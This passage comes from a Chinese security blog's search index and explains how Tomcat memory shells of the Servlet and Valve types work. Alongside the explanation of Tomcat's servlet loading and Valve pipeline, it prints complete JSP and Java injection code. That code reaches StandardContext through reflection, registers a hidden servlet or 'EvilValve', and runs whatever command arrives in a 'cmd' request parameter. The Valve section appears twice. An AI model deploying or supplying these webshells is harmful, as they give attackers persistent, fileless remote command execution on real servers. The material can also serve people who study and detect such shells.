\u6240\u4ee5\u6211\u4eec\u9700\u8981\u81ea\u5df1\u53bb\u5b9e\u73b0\u52a8\u6001\u6dfb\u52a0Servlet\u7684\u529f\u80fd\uff0c\u5728\u6b64\u4e4b\u524d\u6211\u4eec\u9700\u8981\u4e86\u89e3Servlet\u7684\u751f\u547d\u5468\u671f(\u4e3b\u8981\u5173\u6ce8\u521d\u59cb\u5316\u548c\u88c5\u8f7d)\u3002","title":"Tomcat\u4e0eServlet"},{"location":"%E5%AE%89%E5%85%A8/java/java%E5%AE%89%E5%85%A8/%E5%86%85%E5%AD%98%E9%A9%AC/Tomcat-Servlet%E5%9E%8B/#servlet\u521d\u59cb\u5316\u6d41\u7a0b\u5206\u6790","text":"\u5728 org.apache.catalina.core.StandardWrapper#setServletClass() \u5904\u4e0b\u65ad\u70b9\u8c03\u8bd5\uff0c\u56de\u6eaf\u5230\u4e0a\u4e00\u5c42\u7684 ContextConfig.configureConetxt() : \u5728\u8fd9\u91cc\u6211\u4eec\u53ef\u4ee5\u5f88\u6e05\u695a\u5730\u770b\u5230Wrapper\u7684\u521d\u59cb\u5316\u6d41\u7a0b\uff0c\u9996\u5148\u8c03\u7528\u521b\u5efa\u4e86wrapper\uff0c\u7136\u540e\u8c03\u7528set\u65b9\u6cd5\u914d\u7f6ewrapper\u76f8\u5173\u7684\u5c5e\u6027\uff0c\u6211\u4eec\u53ef\u4ee5\u53c2\u8003web.xml\u4e2d\u9700\u8981\u914d\u7f6e\u7684\u5c5e\u6027\u6765\u63a8\u6d4bwrapper\u7684\u5173\u952e\u5c5e\u6027(\u5373\u56fe\u4e2d\u7ea2\u6846)\uff0c\u9700\u8981\u7559\u610f\u7684\u4e00\u4e2a\u7279\u6b8a\u5c5e\u6027\u662fload-on-startup\u5c5e\u6027\uff0c\u5b83\u662f\u4e00\u4e2a\u542f\u52a8\u4f18\u5148\u7ea7\uff0c\u540e\u7eed\u518d\u5206\u6790: \u63a5\u7740\u7ee7\u7eed\u914d\u7f6ewrapper\u7684servletClass: \u914d\u7f6e\u5b8c\u6210\u4e4b\u540e\u4f1a\u5c06wrapper\u653e\u5165StandardContext\u7684child\u91cc: \u63a5\u7740\u4f1a\u904d\u5386web.xml\u4e2dservlet-mapping\u7684servlet-name\u548c\u5bf9\u5e94\u7684url-pattern\uff0c\u8c03\u7528 StandardContext.addServletMappingDecoded() \u6dfb\u52a0servlet\u5bf9\u5e94\u7684\u6620\u5c04: \u603b\u7ed3\u4e00\u4e0b\uff0cServlet\u7684\u521d\u59cb\u5316\u4e00\u5171\u6709\u51e0\u4e2a\u6b65\u9aa4: 1. \u901a\u8fc7 context.createWapper() \u521b\u5efa Wapper \u5bf9\u8c61 2. \u8bbe\u7f6e Servlet \u7684 LoadOnStartUp \u7684\u503c(\u540e\u7eed\u5206\u6790\u4e3a\u4ec0\u4e48\u52a8\u6001\u6ce8\u518cServlet\u9700\u8981\u8bbe\u7f6e\u8be5\u5c5e\u6027) 3. \u8bbe\u7f6e Servlet \u7684 Name 4. \u8bbe\u7f6e Servlet \u5bf9\u5e94\u7684 Class 5. \u5c06 Servlet \u6dfb\u52a0\u5230 context \u7684 children \u4e2d 6. \u5c06 url \u8def\u5f84\u548c servlet \u7c7b\u505a\u6620\u5c04","title":"Servlet\u521d\u59cb\u5316\u6d41\u7a0b\u5206\u6790"},{"location":"%E5%AE%89%E5%85%A8/java/java%E5%AE%89%E5%85%A8/%E5%86%85%E5%AD%98%E9%A9%AC/Tomcat-Servlet%E5%9E%8B/#servlet\u88c5\u8f7d\u6d41\u7a0b\u5206\u6790","text":"\u5728 org.apache.catalina.core.StandardWapper#loadServlet() \u5904\u4e0b\u65ad\u70b9\u8c03\u8bd5\uff0c\u56de\u6eaf\u5230 StandardContext.startInternal() \u65b9\u6cd5: \u53ef\u4ee5\u770b\u5230\uff0c\u662f\u5728\u52a0\u8f7d\u5b8cListener\u548cFilter\u4e4b\u540e\uff0c\u624d\u88c5\u8f7dServlet: \u8fd9\u91cc\u8c03\u7528\u4e86 findChildren() \u65b9\u6cd5\u4eceStandardContext\u4e2d\u62ff\u5230\u6240\u6709\u7684child\u5e76\u4f20\u5230 loadOnStartUp() \u65b9\u6cd5\u5904\u7406\uff0c\u8ddf\u5230 loadOnstartup() \uff0c\u53ef\u4ee5\u6839\u636e\u4ee3\u7801\u548c\u6ce8\u91ca\u4e86\u89e3\u5230\u8fd9\u4e2a\u65b9\u6cd5\u4f1a\u5c06\u6240\u6709load-on-startup\u5c5e\u6027\u5927\u4e8e0\u7684wrapper\u52a0\u8f7d(\u53cd\u4e4b\u5219\u4e0d\u4f1a)\uff0c\u8fd9\u4e5f\u662f\u4e3a\u4ec0\u4e48\u4e0a\u6587\u6211\u4eec\u63d0\u5230\u9700\u8981\u5173\u6ce8\u8fd9\u4e2a\u5c5e\u6027\u7684\u539f\u56e0: \u6839\u636e\u641c\u7d22\uff0c\u6211\u4eec\u4e86\u89e3\u5230load-on-startup\u5c5e\u6027\u7684\u4f5c\u7528: load-on-startup \u8fd9\u4e2a\u5143\u7d20\u7684\u542b\u4e49\u662f\u5728\u670d\u52a1\u5668\u542f\u52a8\u7684\u65f6\u5019\u5c31\u52a0\u8f7d\u8fd9\u4e2aservlet(\u5b9e\u4f8b\u5316\u5e76\u8c03\u7528init()\u65b9\u6cd5). \u8fd9\u4e2a\u5143\u7d20\u4e2d\u7684\u53ef\u9009\u5185\u5bb9\u5fc5\u987b\u4e3a\u4e00\u4e2a\u6574\u6570,\u8868\u660e\u4e86\u8fd9\u4e2aservlet\u88ab\u52a0\u8f7d\u7684\u5148\u540e\u987a\u5e8f. \u5f53\u662f\u4e00\u4e2a\u8d1f\u6570\u65f6\u6216\u8005\u6ca1\u6709\u6307\u5b9a\u65f6\uff0c\u5219\u8868\u793a\u670d\u52a1\u5668\u5728\u8be5servlet\u88ab\u8c03\u7528\u65f6\u624d\u52a0\u8f7d\u3002 \u53ef\u4ee5\u770b\u5230\u5f53\u672a\u8bbe\u7f6eload-on-startup\u5c5e\u6027\u662f\uff0ctomcat\u91c7\u7528\u7684\u662f\u4e00\u79cd\u61d2\u52a0\u8f7d\u7684\u673a\u5236\uff0c\u53ea\u6709servlet\u88ab\u8c03\u7528\u65f6\u624d\u4f1a\u52a0\u8f7d\u5230Context\u4e2d\u3002 \u7531\u4e8e\u6211\u4eec\u9700\u8981\u52a8\u6001\u6ce8\u518cServlet\uff0c\u4e3a\u4e86\u4f7f\u5176\u88ab\u52a0\u8f7d\uff0c\u6211\u4eec\u5fc5\u987b\u8bbe\u7f6eload-on-startup\u5c5e\u6027\u3002","title":"Servlet\u88c5\u8f7d\u6d41\u7a0b\u5206\u6790"},{"location":"%E5%AE%89%E5%85%A8/java/java%E5%AE%89%E5%85%A8/%E5%86%85%E5%AD%98%E9%A9%AC/Tomcat-Servlet%E5%9E%8B/#\u5185\u5b58\u9a6c\u5b9e\u73b0\u6d41\u7a0b\u5206\u6790","text":"\u6839\u636e\u4e0a\u8ff0\u7684\u6d41\u7a0b\u5206\u6790\uff0c\u6211\u4eec\u53ef\u4ee5\u6a21\u4eff\u4e0a\u8ff0\u7684\u52a0\u8f7d\u673a\u5236\u624b\u52a8\u6ce8\u518c\u4e00\u4e2aservlet: 1. \u627e\u5230StandardContext 2. \u7ee7\u627f\u5e76\u7f16\u5199\u4e00\u4e2a\u6076\u610fservlet 3. \u901a\u8fc7 context.createWapper() \u521b\u5efa Wapper \u5bf9\u8c61 2. \u8bbe\u7f6e Servlet \u7684 LoadOnStartUp \u7684\u503c 3. \u8bbe\u7f6e Servlet \u7684 Name 4. \u8bbe\u7f6e Servlet \u5bf9\u5e94\u7684 Class 5. \u5c06 Servlet \u6dfb\u52a0\u5230 context \u7684 children \u4e2d 6. \u5c06 url \u8def\u5f84\u548c servlet \u7c7b\u505a\u6620\u5c04 \u4ee5\u4e0b\u662f\u4ee3\u7801\u7684\u5177\u4f53\u5b9e\u73b0: <%@ page contentType=\"text/html;charset=UTF-8\" language=\"java\" %> <%@ page import=\"org.apache.catalina.core.ApplicationContext\" %> <%@ page import=\"org.apache.catalina.core.StandardContext\" %> <%@ page import=\"javax.servlet.*\" %> <%@ page import=\"javax.servlet.annotation.WebServlet\" %> <%@ page import=\"javax.servlet.http.HttpServlet\" %> <%@ page import=\"javax.servlet.http.HttpServletRequest\" %> <%@ page import=\"javax.servlet.http.HttpServletResponse\" %> <%@ page import=\"java.io.IOException\" %> <%@ page import=\"java.lang.reflect.Field\" %> <%@ page import=\"org.apache.catalina.Wrapper\" %> <%@ page import=\"org.apache.catalina.connector.Request\" %> <% class S implements Servlet{ @Override public void init(ServletConfig config) throws ServletException { } @Override public ServletConfig getServletConfig() { return null; } @Override public void service(ServletRequest req, ServletResponse res) throws ServletException, IOException { String cmd = req.getParameter(\"cmd\"); if(cmd != null){ try { Runtime.getRuntime().exec(cmd); } catch (IOException e) {} } } @Override public String getServletInfo() { return null; } @Override public void destroy() { } } %> <% // ServletContext servletContext = request.getServletContext(); // Field appctx = servletContext.getClass().getDeclaredField(\"context\"); // appctx.setAccessible(true); // ApplicationContext applicationContext = (ApplicationContext) appctx.get(servletContext); // Field stdctx = applicationContext.getClass().getDeclaredField(\"context\"); // stdctx.setAccessible(true); // StandardContext standardContext = (StandardContext) stdctx.get(applicationContext); // \u66f4\u7b80\u5355\u7684\u65b9\u6cd5 \u83b7\u53d6StandardContext Field reqF = request.getClass().getDeclaredField(\"request\"); reqF.setAccessible(true); Request req = (Request) reqF.get(request); StandardContext standardContext = (StandardContext) req.getContext(); S servlet = new S(); String name = servlet.getClass().getSimpleName(); Wrapper newWrapper = standardContext.createWrapper(); newWrapper.setName(name); newWrapper.setLoadOnStartup(1); newWrapper.setServlet(servlet); newWrapper.setServletClass(servlet.getClass().getName()); standardContext.addChild(newWrapper); standardContext.addServletMappingDecoded(\"/longlone\", name); out.println(\"inject success\"); %>","title":"\u5185\u5b58\u9a6c\u5b9e\u73b0\u6d41\u7a0b\u5206\u6790"},{"location":"%E5%AE%89%E5%85%A8/java/java%E5%AE%89%E5%85%A8/%E5%86%85%E5%AD%98%E9%A9%AC/Tomcat-Servlet%E5%9E%8B/#\u4f18\u7f3a\u70b9\u5206\u6790","text":"\u7f3a\u70b9: - \u8fd9\u79cd\u7c7b\u578b\u7684\u5185\u5b58\u9a6c\u9700\u8981\u8bbf\u95ee\u5177\u4f53\u8def\u5f84\u624d\u80fd\u591f\u547d\u4ee4\u6267\u884c\uff0c\u65e5\u5fd7\u4e2d\u6bd4\u8f83\u5bb9\u6613\u88ab\u53d1\u73b0 \u4f18\u70b9: - \u517c\u5bb9\u6027\u5f3a\uff0c\u517c\u5bb9tomcat7","title":"\u4f18\u7f3a\u70b9\u5206\u6790"},{"location":"%E5%AE%89%E5%85%A8/java/java%E5%AE%89%E5%85%A8/%E5%86%85%E5%AD%98%E9%A9%AC/Tomcat-Valve%E5%9E%8B/","tags":["java","java\u5b89\u5168","\u5185\u5b58\u9a6c"],"text":"Tomcat-Valve\u578b\u5185\u5b58\u9a6c # \u53c2\u8003\u6587\u7ae0 # https://su18.org/post/memory-shell/#tomcat-valve-%E5%86%85%E5%AD%98%E9%A9%AC \u5f15\u5b50 # \u5b9e\u9645\u4e0a\u5728\u6211\u4eec\u8c03\u8bd5Tomcat-Filter\u578b\u5185\u5b58\u9a6c\u7684\u65f6\u5019\uff0c\u6211\u4eec\u67e5\u770b\u8c03\u7528\u6808\u4f1a\u53d1\u73b0\u4e00\u4e9b\u6709\u8da3\u7684\u4e1c\u897f: \u6211\u4eec\u4f1a\u53d1\u73b0\u8fd9\u91cc\u5b58\u5728\u4e00\u5806\u7684invoke\u65b9\u6cd5\u7684\u8c03\u7528\uff0c\u90a3\u4e48\u8fd9\u4e9bValve\u7a76\u7adf\u662f\u4ec0\u4e48\u5462\uff1f Valve\u4e0ePipeline # Tomcat \u5728\u5904\u7406\u4e00\u4e2a\u8bf7\u6c42\u8c03\u7528\u903b\u8f91\u65f6\uff0c\u662f\u5982\u4f55\u5904\u7406\u548c\u4f20\u9012 Request \u548c Respone \u5bf9\u8c61\u7684\u5462\uff1f\u4e3a\u4e86\u6574\u4f53\u67b6\u6784\u7684\u6bcf\u4e2a\u7ec4\u4ef6\u7684\u53ef\u4f38\u7f29\u6027\u548c\u53ef\u6269\u5c55\u6027\uff0cTomcat \u4f7f\u7528\u4e86\u804c\u8d23\u94fe\u6a21\u5f0f\u6765\u5b9e\u73b0\u5ba2\u6237\u7aef\u8bf7\u6c42\u7684\u5904\u7406\u3002\u5728 Tomcat \u4e2d\u5b9a\u4e49\u4e86\u4e24\u4e2a\u63a5\u53e3\uff1aPipeline\uff08\u7ba1\u9053\uff09\u548c Valve\uff08\u9600\uff09\u3002\u8fd9\u4e24\u4e2a\u63a5\u53e3\u540d\u5b57\u5f88\u597d\u7684\u8be0\u91ca\u4e86\u5904\u7406\u6a21\u5f0f\uff1a\u6570\u636e\u6d41\u5c31\u50cf\u662f\u6d41\u7ecf\u7ba1\u9053\u7684\u6c34\u4e00\u6837\uff0c\u7ecf\u8fc7\u7ba1\u9053\u4e0a\u4e2a\u4e00\u4e2a\u4e2a\u9600\u95e8\u3002 Pipeline \u4e2d\u4f1a\u6709\u4e00\u4e2a\u6700\u57fa\u7840\u7684 Valve\uff08basic\uff09\uff0c\u5b83\u59cb\u7ec8\u4f4d\u4e8e\u672b\u7aef\uff08\u6700\u540e\u6267\u884c\uff09\uff0c\u5c01\u88c5\u4e86\u5177\u4f53\u7684\u8bf7\u6c42\u5904\u7406\u548c\u8f93\u51fa\u54cd\u5e94\u7684\u8fc7\u7a0b\u3002Pipeline \u63d0\u4f9b\u4e86 addValve \u65b9\u6cd5\uff0c\u53ef\u4ee5\u6dfb\u52a0\u65b0 Valve \u5728 basic \u4e4b\u524d\uff0c\u5e76\u6309\u7167\u6dfb\u52a0\u987a\u5e8f\u6267\u884c\u3002 Tomcat \u6bcf\u4e2a\u5c42\u7ea7\u7684\u5bb9\u5668\uff08Engine\u3001Host\u3001Context\u3001Wrapper\uff09\uff0c\u90fd\u6709\u57fa\u7840\u7684 Valve \u5b9e\u73b0\uff08StandardEngineValve\u3001StandardHostValve\u3001StandardContextValve\u3001StandardWrapperValve\uff09\uff0c\u4ed6\u4eec\u540c\u65f6\u7ef4\u62a4\u4e86\u4e00\u4e2a Pipeline \u5b9e\u4f8b\uff08StandardPipeline\uff09\uff0c\u4e5f\u5c31\u662f\u8bf4\uff0c\u6211\u4eec\u53ef\u4ee5\u5728\u4efb\u4f55\u5c42\u7ea7\u7684\u5bb9\u5668\u4e0a\u9488\u5bf9\u8bf7\u6c42\u5904\u7406\u8fdb\u884c\u6269\u5c55\u3002\u8fd9\u56db\u4e2a Valve \u7684\u57fa\u7840\u5b9e\u73b0\u90fd\u7ee7\u627f\u4e86 ValveBase\u3002\u8fd9\u4e2a\u7c7b\u5e2e\u6211\u4eec\u5b9e\u73b0\u4e86\u751f\u547d\u63a5\u53e3\u53caMBean \u63a5\u53e3\uff0c\u4f7f\u6211\u4eec\u53ea\u9700\u4e13\u6ce8\u9600\u95e8\u7684\u903b\u8f91\u5904\u7406\u5373\u53ef\u3002 \u540c\u65f6\u6211\u4eec\u53ef\u4ee5\u89c2\u5bdfValve\u7684\u5b9e\u73b0\uff0c\u6bd4\u5982StandardEngineValve: final class StandardEngineValve extends ValveBase { //... public final void invoke ( Request request , Response response ) //... } } \u53ef\u4ee5\u53d1\u73b0\u5176\u76f4\u63a5\u7ee7\u627f\u4e86ValveBase\uff0c\u800c\u4e14\u5728invoke\u65b9\u6cd5\u4e2d\u6211\u4eec\u80fd\u62ff\u5230request\u548cresponse\u3002 \u5185\u5b58\u9a6c\u5b9e\u73b0\u6d41\u7a0b\u5206\u6790 # \u6839\u636e\u4e0a\u8ff0\u7684\u63cf\u8ff0\u6211\u4eec\u53d1\u73b0\uff0cValve\u4e5f\u53ef\u80fd\u4f5c\u4e3a\u5185\u5b58\u9a6c\uff0c\u9996\u5148\u6211\u4eec\u9700\u8981\u8003\u8651\u5982\u4f55\u62ff\u5230StandardPipeline\uff0c\u5b9e\u9645\u4e0a\u6839\u636e\u6211\u4eec\u8c03\u7528\u6808\u548c\u4e0a\u6587\u5206\u6790\u5f88\u5bb9\u6613\u53d1\u73b0\uff0c\u5728StandardContext\u91cc\u5c31\u5b58\u5728 getPipeline() \u65b9\u6cd5\uff0c\u6240\u4ee5\u6211\u4eec\u8001\u6837\u5b50\u53ea\u9700\u8981\u62ff\u5230StandardContext\u5373\u53ef\u3002 \u6700\u540e\u603b\u7ed3\u4e0bFilter\u578b\u5185\u5b58\u9a6c(\u5373\u52a8\u6001\u521b\u5efafilter)\u7684\u6b65\u9aa4: 1. \u83b7\u53d6StandardContext 2. \u7ee7\u627f\u5e76\u7f16\u5199\u4e00\u4e2a\u6076\u610fvalve 3. \u8c03\u7528 StandardContext.addValve() \u6dfb\u52a0\u6076\u610fvalve\u5b9e\u4f8b \u5177\u4f53\u4ee3\u7801\u5b9e\u73b0\u5982\u4e0b: java\u7248\u672c: package top.longlone.servlet ; import org.apache.catalina.connector.Request ; import org.apache.catalina.connector.Response ; import org.apache.catalina.core.StandardContext ; import org.apache.catalina.valves.ValveBase ; import javax.servlet.ServletException ; import javax.servlet.http.HttpServlet ; import javax.servlet.http.HttpServletRequest ; import javax.servlet.http.HttpServletResponse ; import java.io.IOException ; import java.lang.reflect.Field ; class EvilValve extends ValveBase { @Override public void invoke ( Request request , Response response ) throws IOException , ServletException { System . out . println ( \"111\" ); try { Runtime . getRuntime (). exec ( request . getParameter ( \"cmd\" )); } catch ( Exception e ) { } } } public class EvilServlet extends HttpServlet { @Override protected void doGet ( HttpServletRequest req , HttpServletResponse resp ) throws ServletException , IOException { try { Field reqF = req . getClass (). getDeclaredField ( \"request\" ); reqF . setAccessible ( true ); Request request = ( Request ) reqF . get ( req ); StandardContext standardContext = ( StandardContext ) request . getContext (); standardContext . getPipeline (). addValve ( new EvilValve ()); resp . getWriter (). write ( \"inject success\" ); } catch ( Exception e ) { } } } \u5728 System.out.println(\"111\"); \u4e0b\u65ad\u70b9\u8c03\u8bd5,\u53ef\u4ee5\u770b\u5230\u6076\u610fValve\u6ce8\u5165\u6210\u529f\uff0cAuthenticatorBase\u7d27\u8ddf\u7740\u7684\u5c31\u662f\u6211\u4eec\u7684EvilValve: jsp\u7248\u672c: <%@ page contentType=\"text/html;charset=UTF-8\" language=\"java\" %> <%@ page import=\"org.apache.catalina.core.ApplicationContext\" %> <%@ page import=\"org.apache.catalina.core.StandardContext\" %> <%@ page import=\"javax.servlet.*\" %> <%@ page import=\"javax.servlet.annotation.WebServlet\" %> <%@ page import=\"javax.servlet.http.HttpServlet\" %> <%@ page import=\"javax.servlet.http.HttpServletRequest\" %> <%@ page import=\"javax.servlet.http.HttpServletResponse\" %> <%@ page import=\"java.io.IOException\" %> <%@ page import=\"java.lang.reflect.Field\" %> <%@ page import=\"org.apache.catalina.Wrapper\" %> <%@ page import=\"org.apache.catalina.connector.Request\" %> <%@ page import=\"org.apache.catalina.valves.ValveBase\" %> <%@ page import=\"org.apache.catalina.connector.Response\" %> <% class EvilValve extends ValveBase { @Override public void invoke(Request request, Response response) throws IOException, ServletException { System.out.println(\"111\"); try { Runtime.getRuntime().exec(request.getParameter(\"cmd\")); } catch (Exception e) { } } }%> <% // \u66f4\u7b80\u5355\u7684\u65b9\u6cd5 \u83b7\u53d6StandardContext Field reqF = request.getClass().getDeclaredField(\"request\"); reqF.setAccessible(true); Request req = (Request) reqF.get(request); StandardContext standardContext = (StandardContext) req.getContext(); standardContext.getPipeline().addValve(new EvilValve()); out.println(\"inject success\"); %>","title":"Tomcat-Valve\u578b\u5185\u5b58\u9a6c"},{"location":"%E5%AE%89%E5%85%A8/java/java%E5%AE%89%E5%85%A8/%E5%86%85%E5%AD%98%E9%A9%AC/Tomcat-Valve%E5%9E%8B/#tomcat-valve\u578b\u5185\u5b58\u9a6c","text":"","title":"Tomcat-Valve\u578b\u5185\u5b58\u9a6c"},{"location":"%E5%AE%89%E5%85%A8/java/java%E5%AE%89%E5%85%A8/%E5%86%85%E5%AD%98%E9%A9%AC/Tomcat-Valve%E5%9E%8B/#\u53c2\u8003\u6587\u7ae0","text":"https://su18.org/post/memory-shell/#tomcat-valve-%E5%86%85%E5%AD%98%E9%A9%AC","title":"\u53c2\u8003\u6587\u7ae0"},{"location":"%E5%AE%89%E5%85%A8/java/java%E5%AE%89%E5%85%A8/%E5%86%85%E5%AD%98%E9%A9%AC/Tomcat-Valve%E5%9E%8B/#\u5f15\u5b50","text":"\u5b9e\u9645\u4e0a\u5728\u6211\u4eec\u8c03\u8bd5Tomcat-Filter\u578b\u5185\u5b58\u9a6c\u7684\u65f6\u5019\uff0c\u6211\u4eec\u67e5\u770b\u8c03\u7528\u6808\u4f1a\u53d1\u73b0\u4e00\u4e9b\u6709\u8da3\u7684\u4e1c\u897f: \u6211\u4eec\u4f1a\u53d1\u73b0\u8fd9\u91cc\u5b58\u5728\u4e00\u5806\u7684invoke\u65b9\u6cd5\u7684\u8c03\u7528\uff0c\u90a3\u4e48\u8fd9\u4e9bValve\u7a76\u7adf\u662f\u4ec0\u4e48\u5462\uff1f","title":"\u5f15\u5b50"},{"location":"%E5%AE%89%E5%85%A8/java/java%E5%AE%89%E5%85%A8/%E5%86%85%E5%AD%98%E9%A9%AC/Tomcat-Valve%E5%9E%8B/#valve\u4e0epipeline","text":"Tomcat \u5728\u5904\u7406\u4e00\u4e2a\u8bf7\u6c42\u8c03\u7528\u903b\u8f91\u65f6\uff0c\u662f\u5982\u4f55\u5904\u7406\u548c\u4f20\u9012 Request \u548c Respone \u5bf9\u8c61\u7684\u5462\uff1f\u4e3a\u4e86\u6574\u4f53\u67b6\u6784\u7684\u6bcf\u4e2a\u7ec4\u4ef6\u7684\u53ef\u4f38\u7f29\u6027\u548c\u53ef\u6269\u5c55\u6027\uff0cTomcat \u4f7f\u7528\u4e86\u804c\u8d23\u94fe\u6a21\u5f0f\u6765\u5b9e\u73b0\u5ba2\u6237\u7aef\u8bf7\u6c42\u7684\u5904\u7406\u3002\u5728 Tomcat \u4e2d\u5b9a\u4e49\u4e86\u4e24\u4e2a\u63a5\u53e3\uff1aPipeline\uff08\u7ba1\u9053\uff09\u548c Valve\uff08\u9600\uff09\u3002\u8fd9\u4e24\u4e2a\u63a5\u53e3\u540d\u5b57\u5f88\u597d\u7684\u8be0\u91ca\u4e86\u5904\u7406\u6a21\u5f0f\uff1a\u6570\u636e\u6d41\u5c31\u50cf\u662f\u6d41\u7ecf\u7ba1\u9053\u7684\u6c34\u4e00\u6837\uff0c\u7ecf\u8fc7\u7ba1\u9053\u4e0a\u4e2a\u4e00\u4e2a\u4e2a\u9600\u95e8\u3002 Pipeline \u4e2d\u4f1a\u6709\u4e00\u4e2a\u6700\u57fa\u7840\u7684 Valve\uff08basic\uff09\uff0c\u5b83\u59cb\u7ec8\u4f4d\u4e8e\u672b\u7aef\uff08\u6700\u540e\u6267\u884c\uff09\uff0c\u5c01\u88c5\u4e86\u5177\u4f53\u7684\u8bf7\u6c42\u5904\u7406\u548c\u8f93\u51fa\u54cd\u5e94\u7684\u8fc7\u7a0b\u3002Pipeline \u63d0\u4f9b\u4e86 addValve \u65b9\u6cd5\uff0c\u53ef\u4ee5\u6dfb\u52a0\u65b0 Valve \u5728 basic \u4e4b\u524d\uff0c\u5e76\u6309\u7167\u6dfb\u52a0\u987a\u5e8f\u6267\u884c\u3002 Tomcat \u6bcf\u4e2a\u5c42\u7ea7\u7684\u5bb9\u5668\uff08Engine\u3001Host\u3001Context\u3001Wrapper\uff09\uff0c\u90fd\u6709\u57fa\u7840\u7684 Valve \u5b9e\u73b0\uff08StandardEngineValve\u3001StandardHostValve\u3001StandardContextValve\u3001StandardWrapperValve\uff09\uff0c\u4ed6\u4eec\u540c\u65f6\u7ef4\u62a4\u4e86\u4e00\u4e2a Pipeline \u5b9e\u4f8b\uff08StandardPipeline\uff09\uff0c\u4e5f\u5c31\u662f\u8bf4\uff0c\u6211\u4eec\u53ef\u4ee5\u5728\u4efb\u4f55\u5c42\u7ea7\u7684\u5bb9\u5668\u4e0a\u9488\u5bf9\u8bf7\u6c42\u5904\u7406\u8fdb\u884c\u6269\u5c55\u3002\u8fd9\u56db\u4e2a Valve \u7684\u57fa\u7840\u5b9e\u73b0\u90fd\u7ee7\u627f\u4e86 ValveBase\u3002\u8fd9\u4e2a\u7c7b\u5e2e\u6211\u4eec\u5b9e\u73b0\u4e86\u751f\u547d\u63a5\u53e3\u53caMBean \u63a5\u53e3\uff0c\u4f7f\u6211\u4eec\u53ea\u9700\u4e13\u6ce8\u9600\u95e8\u7684\u903b\u8f91\u5904\u7406\u5373\u53ef\u3002 \u540c\u65f6\u6211\u4eec\u53ef\u4ee5\u89c2\u5bdfValve\u7684\u5b9e\u73b0\uff0c\u6bd4\u5982StandardEngineValve: final class StandardEngineValve extends ValveBase { //... public final void invoke ( Request request , Response response ) //... } } \u53ef\u4ee5\u53d1\u73b0\u5176\u76f4\u63a5\u7ee7\u627f\u4e86ValveBase\uff0c\u800c\u4e14\u5728invoke\u65b9\u6cd5\u4e2d\u6211\u4eec\u80fd\u62ff\u5230request\u548cresponse\u3002","title":"Valve\u4e0ePipeline"},{"location":"%E5%AE%89%E5%85%A8/java/java%E5%AE%89%E5%85%A8/%E5%86%85%E5%AD%98%E9%A9%AC/Tomcat-Valve%E5%9E%8B/#\u5185\u5b58\u9a6c\u5b9e\u73b0\u6d41\u7a0b\u5206\u6790","text":"\u6839\u636e\u4e0a\u8ff0\u7684\u63cf\u8ff0\u6211\u4eec\u53d1\u73b0\uff0cValve\u4e5f\u53ef\u80fd\u4f5c\u4e3a\u5185\u5b58\u9a6c\uff0c\u9996\u5148\u6211\u4eec\u9700\u8981\u8003\u8651\u5982\u4f55\u62ff\u5230StandardPipeline\uff0c\u5b9e\u9645\u4e0a\u6839\u636e\u6211\u4eec\u8c03\u7528\u6808\u548c\u4e0a\u6587\u5206\u6790\u5f88\u5bb9\u6613\u53d1\u73b0\uff0c\u5728StandardContext\u91cc\u5c31\u5b58\u5728 getPipeline() \u65b9\u6cd5\uff0c\u6240\u4ee5\u6211\u4eec\u8001\u6837\u5b50\u53ea\u9700\u8981\u62ff\u5230StandardContext\u5373\u53ef\u3002 \u6700\u540e\u603b\u7ed3\u4e0bFilter\u578b\u5185\u5b58\u9a6c(\u5373\u52a8\u6001\u521b\u5efafilter)\u7684\u6b65\u9aa4: 1. \u83b7\u53d6StandardContext 2. \u7ee7\u627f\u5e76\u7f16\u5199\u4e00\u4e2a\u6076\u610fvalve 3. \u8c03\u7528 StandardContext.addValve() \u6dfb\u52a0\u6076\u610fvalve\u5b9e\u4f8b \u5177\u4f53\u4ee3\u7801\u5b9e\u73b0\u5982\u4e0b: java\u7248\u672c: package top.longlone.servlet ; import org.apache.catalina.connector.Request ; import org.apache.catalina.connector.Response ; import org.apache.catalina.core.StandardContext ; import org.apache.catalina.valves.ValveBase ; import javax.servlet.ServletException ; import javax.servlet.http.HttpServlet ; import javax.servlet.http.HttpServletRequest ; import javax.servlet.http.HttpServletResponse ; import java.io.IOException ; import java.lang.reflect.Field ; class EvilValve extends ValveBase { @Override public void invoke ( Request request , Response response ) throws IOException , ServletException { System . out . println ( \"111\" ); try { Runtime . getRuntime (). exec ( request . getParameter ( \"cmd\" )); } catch ( Exception e ) { } } } public class EvilServlet extends HttpServlet { @Override protected void doGet ( HttpServletRequest req , HttpServletResponse resp ) throws ServletException , IOException { try { Field reqF = req . getClass (). getDeclaredField ( \"request\" ); reqF . setAccessible ( true ); Request request = ( Request ) reqF . get ( req ); StandardContext standardContext = ( StandardContext ) request . getContext (); standardContext . getPipeline (). addValve ( new EvilValve ()); resp . getWriter (). write ( \"inject success\" ); } catch ( Exception e ) { } } } \u5728 System.out.println(\"111\"); \u4e0b\u65ad\u70b9\u8c03\u8bd5,\u53ef\u4ee5\u770b\u5230\u6076\u610fValve\u6ce8\u5165\u6210\u529f\uff0cAuthenticatorBase\u7d27\u8ddf\u7740\u7684\u5c31\u662f\u6211\u4eec\u7684EvilValve: jsp\u7248\u672c: <%@ page contentType=\"text/html;charset=UTF-8\" language=\"java\" %> <%@ page import=\"org.apache.catalina.core.ApplicationContext\" %> <%@ page import=\"org.apache.catalina.core.StandardContext\" %> <%@ page import=\"javax.servlet.*\" %> <%@ page import=\"javax.servlet.annotation.WebServlet\" %> <%@ page import=\"javax.servlet.http.HttpServlet\" %> <%@ page import=\"javax.servlet.http.HttpServletRequest\" %> <%@ page import=\"javax.servlet.http.HttpServletResponse\" %> <%@ page import=\"java.io.IOException\" %> <%@ page import=\"java.lang.reflect.Field\" %> <%@ page import=\"org.apache.catalina.Wrapper\" %> <%@ page import=\"org.apache.catalina.connector.Request\" %> <%@ page import=\"org.apache.catalina.valves.ValveBase\" %> <%@ page import=\"org.apache.catalina.connector.Response\" %> <% class EvilValve extends ValveBase { @Override public void invoke(Request request, Response response) throws IOException, ServletException { System.out.println(\"111\"); try { Runtime.getRuntime().exec(request.getParameter(\"cmd\")); } catch (Exception e) { } } }%> <% // \u66f4\u7b80\u5355\u7684\u65b9\u6cd5 \u83b7\u53d6StandardContext Field reqF = request.getClass().getDeclaredField(\"request\"); reqF.setAccessible(true); Request req = (Request) reqF.get(request); StandardContext standardContext = (StandardContext) req.getContext(); standardContext.getPipeline().addValve(new EvilValve()); out.println(\"inject success\"); 